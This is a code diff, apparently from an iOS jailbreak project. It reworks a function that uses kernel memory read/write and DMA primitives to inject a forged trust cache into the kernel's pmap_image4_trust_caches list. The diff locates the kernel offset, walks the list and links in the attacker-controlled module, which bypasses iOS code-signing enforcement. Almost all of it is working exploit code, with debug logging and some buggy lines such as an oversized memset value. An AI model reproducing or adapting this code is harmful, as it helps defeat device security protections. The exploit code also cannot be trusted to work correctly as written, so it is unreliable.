@@ -17,6 +17,7 @@
 #define SYSTEM_VERSION_EQUAL_TO(v)                  ([[[UIDevice currentDevice] systemVersion] compare:v options:NSNumericSearch] == NSOrderedSame)
 #define SYSTEM_VERSION_GREATER_THAN_OR_EQUAL_TO(v)  ([[[UIDevice currentDevice] systemVersion] compare:v options:NSNumericSearch] != NSOrderedAscending)
 mach_port_t amfid_exceptionport;
+objcbridge *theobjcbridge;
 extern int spawnRoot(NSString* path, NSArray* args, NSString** stdOut, NSString** stdErr); // this gives me the heebeejeebees (or however the fuck you spell it)
 extern int userspaceReboot(void);
 static uint64_t thread_copy_jop_pid(mach_port_t to, mach_port_t from)
@@ -590,13 +591,23 @@ size_t kwritebuf_tcinject(uint64_t where, const void *p, size_t size) {
     return size;
 }
 void tcinjecttest(void) {
-    UInt64 pmap_image4_trust_caches = 0xfffffff007c084d8 /*MAYBE??!*/ + get_kernel_slide(); //still need to figure out how to find this damn offset lol.
+    theobjcbridge = [[objcbridge alloc] init];
+    UInt64 pmap_image4_trust_caches =  [theobjcbridge find_pmap_image4_trust_caches]; //WOOO
+    NSLog(@"Found pmap_image4_trust_caches at %p",pmap_image4_trust_caches);
+    sleep(1);
+    pmap_image4_trust_caches += get_kernel_slide();
+    NSLog(@"pmap_image4_trust_caches slid: %p", pmap_image4_trust_caches);
     UInt64 mem = alloc(0x4000);
     UInt64 payload = alloc(0x4000);
     if(mem == 0) {
         NSLog(@"Failed to allocate memory for TrustCache: %p",mem);
         exit(EXIT_FAILURE); // ensure no kpanics
     }
+    NSLog(@"Ensuring allocated memory is filled with data for later translation.");
+    memset((void*)mem,0x414141414141,0x4000);
+    memset((void*)payload,0x414141414141,0x4000);
+    NSLog(@"Filled allocated memory!");
+    sleep(1);
     NSLog(@"Writing blackbathingsuit!");
     NSString  *str = @"blackbathingsuit";
     NSData *data = [str dataUsingEncoding: NSASCIIStringEncoding];
@@ -614,11 +625,11 @@ void tcinjecttest(void) {
     memcpy((void*)mem + offsetof(trustcache_module, module_size),&len,sizeof(UInt64));
     NSLog(@"Wrote length!");
     sleep(1);
-    UInt64 mempaddr = vtophys_kfd(mem);
-    UInt64 memkaddr = phystokv_kfd(mempaddr);
     UInt64 trustcache = kread64_ptr_kfd(pmap_image4_trust_caches);
-    NSLog(@"Beginning trustcache insertion!");
+    NSLog(@"Beginning trustcache insertion!: trustcache gave: %p",trustcache);
     if(!trustcache) {
+        UInt64 mempaddr = vtophys_kfd(mem);
+        UInt64 memkaddr = phystokv_kfd(mempaddr);
         dma_perform(^{
             dma_writevirt64(pmap_image4_trust_caches, memkaddr);
         });
@@ -628,18 +639,26 @@ void tcinjecttest(void) {
     UInt64 prev = 0;
     NSLog(@"Entering while(trustcache)!");
     sleep(1);
-    /*
     while(trustcache) {
         prev = trustcache;
         trustcache = kread64_ptr_kfd(trustcache);
-    } */ // knew this was broken.
-    prev = trustcache;
+    }
+    NSLog(@"Final trustcache addr: %p",prev);
+    sleep(1);
+    NSLog(@"Writing previous to allocated trustcache before translating!");
+    memcpy((void*)mem+8, &prev, sizeof(UInt64));
+    NSLog(@"Wrote previous to allocated trustcache!");
+    sleep(1);
+    UInt64 mempaddr = vtophys_kfd(mem);
+    UInt64 memkaddr = phystokv_kfd(mempaddr);
+    NSLog(@"memkaddr: %p", memkaddr);
+    sleep(1);
     NSLog(@"Entering dma_perform!");
     sleep(1);
     dma_perform(^{
         NSLog(@"Entered dma_perform!");
         dma_writevirt64(prev, memkaddr);
-        dma_writevirt64(memkaddr+8, prev);
+        NSLog(@"Did write!");
     });
 done:
     sleep(1);
